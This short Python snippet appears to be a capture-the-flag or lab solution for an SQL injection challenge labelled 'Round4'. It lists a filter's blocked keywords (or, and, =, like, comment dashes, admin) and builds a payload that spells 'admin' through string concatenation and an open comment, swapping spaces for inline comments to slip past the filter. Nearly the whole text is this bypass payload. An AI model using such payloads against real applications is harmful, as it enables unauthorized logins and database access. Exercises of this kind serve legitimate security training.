blacklist = ['Round4: or and = like > < -- admin']
payload = r"""'a' || 'dmin'/*"""
print(payload.replace(' ', '/**/'))